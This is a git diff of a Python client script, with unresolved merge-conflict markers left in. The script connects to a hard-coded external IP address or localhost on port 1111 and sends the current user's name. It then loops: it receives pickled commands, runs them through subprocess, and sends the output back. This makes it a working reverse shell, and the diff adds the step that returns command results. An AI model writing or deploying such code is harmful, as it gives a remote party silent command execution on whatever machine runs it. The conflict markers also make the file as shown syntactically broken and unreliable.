@@ -10,7 +10,13 @@ import time
 
 
 socket = socket.socket()
+<<<<<<< HEAD
 serverAddress = '145.109.173.68', 1111
+=======
+HVA = '145.109.173.68'
+l = 'localhost'
+serverAddress = l, 1111
+>>>>>>> 818284877ebfc5b00cf6ea22aff4c88246b428f1
 
 #   --> Execute a command and return the result of it
 def popenExecution(data):
@@ -18,10 +24,21 @@ def popenExecution(data):
     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     return str(command.stdout.read() + command.stderr.read(), "utf-8")
 
-def recv(socket):
+def send(socket, payload):
+    try:
+        socket.send(pickle.dumps(payload))
+    except Exception as e:
+        print(e)
+        time.sleep(1)
+        
+
+def receive(socket):
     try:
         message = pickle.loads(socket.recv(2048))
+        send(socket, popenExecution(message))
         print(message)
+
+
     except Exception as e:
         print(e)
 
@@ -29,9 +46,9 @@ def main():
     
     socket.connect(serverAddress)
     #Standard command to identify who this machine is
-    socket.send(pickle.dumps(popenExecution("who").split()[0])) #send the first result of who
+    socket.send(pickle.dumps(popenExecution("who").split()[0])) 
     while True:
-        recv(socket)
+        receive(socket)
         time.sleep(1)
 
 
